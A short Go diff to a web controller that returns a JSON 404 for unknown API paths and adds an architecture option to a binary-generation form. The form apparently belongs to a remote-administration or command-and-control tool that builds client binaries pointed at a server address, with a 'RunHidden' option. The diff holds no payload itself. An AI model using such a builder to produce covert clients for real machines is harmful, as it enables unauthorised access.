@@ -32,6 +32,11 @@ var upgrader = websocket.Upgrader{
 }
 
 func (h *httpController) noRouteHandler(c *gin.Context) {
+	if strings.HasPrefix(c.Request.URL.Path, apiPathPrefix) {
+		c.JSON(http.StatusNotFound, gin.H{"error": "not found"})
+		c.Abort()
+		return
+	}
 	c.Redirect(http.StatusMovedPermanently, "/")
 	c.Abort()
 	return
@@ -201,6 +206,7 @@ func (h *httpController) generateBinaryGetHandler(c *gin.Context) {
 		"Address":  network.GetLocalIP(),
 		"Port":     strings.ReplaceAll(h.Configuration.Server.Port, ":", ""),
 		"OSTarget": system.OSTargetMap,
+		"OSArchs":  system.OSTargetArchMap,
 	})
 	return
 }
@@ -221,6 +227,7 @@ func (h *httpController) generateBinaryPostHandler(c *gin.Context) {
 		ServerAddress: req.Address,
 		ServerPort:    req.Port,
 		OSTarget:      system.OSTargetIntMap[osTarget],
+		OSArch:        req.OSArch,
 		Filename:      req.Filename,
 		RunHidden:     utils.ParseCheckboxBoolean(req.RunHidden),
 	})
